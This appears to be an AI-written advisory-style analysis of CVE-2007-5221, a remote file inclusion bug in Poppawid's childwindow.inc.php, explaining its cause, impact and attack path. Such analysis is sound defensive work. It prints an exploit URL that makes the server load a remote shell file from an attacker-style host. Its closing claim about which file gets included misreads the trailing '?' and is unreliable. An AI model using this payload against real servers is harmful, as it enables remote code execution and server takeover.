Based on the provided content, here's an analysis of CVE-2007-5221:

**Root Cause of Vulnerability:**

The vulnerability stems from a flaw in the `childwindow.inc.php` file within the Poppawid application. Specifically, the `include()` function on line 33 uses a variable `$form` that is directly derived from user input, without any sanitization or validation.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is a Remote File Inclusion, because the `$form` variable, taken from user input, is used in an `include()` statement. This allows an attacker to include a remote file from an arbitrary URL.
*   **Lack of Input Sanitization:** The code fails to sanitize or validate user-supplied input, allowing an attacker to manipulate the `$form` variable.
*   **`register_globals=On` (Implied):** The exploit notes `register_globals=On`, which would make it easier to inject and control the `$form` variable. While not a direct vulnerability of the code, it shows how the environment contributed to the issue.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** An attacker could include a malicious PHP file containing arbitrary code, leading to complete compromise of the server. This would allow the attacker to execute arbitrary code with the same privileges as the web server.
*   **Data Theft/Manipulation:**  Through the injected code, an attacker could potentially steal sensitive information or modify data stored on the server.
*   **Denial of Service:** The attacker could also use the file inclusion vulnerability to mount a denial of service attack by including a file that consumes server resources.

**Attack Vectors:**

*   **HTTP GET Request:** The attack is performed by crafting a URL that includes a malicious value for the `form` parameter, which will be processed by `childwindow.inc.php`.
*   **Direct Exploitation via URL Parameter:** The vulnerability is directly exploitable through manipulating a GET parameter (`form`) in the URL.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the server running the vulnerable Poppawid application.
*   **Knowledge of Vulnerable Path:** The attacker needs to know the vulnerable path (`/mail/childwindow.inc.php`) and the vulnerable parameter (`form`).
*   **Ability to Host a Malicious File:** The attacker needs to host a malicious PHP file on a server that can be accessed by the vulnerable application's server.

**Technical Details:**

The relevant code snippet from `childwindow.inc.php` is:

```php
<?php include($form.".form.inc.php");?>
```

The exploit uses the following URL:

```
http://x.com/[path]/mail/childwindow.inc.php?form=http://h4x0r.org/shell.txt?
```

This would cause the server to attempt to include the remote file `http://h4x0r.org/shell.txt.form.inc.php`, which is under the attacker's control, thus executing malicious code.
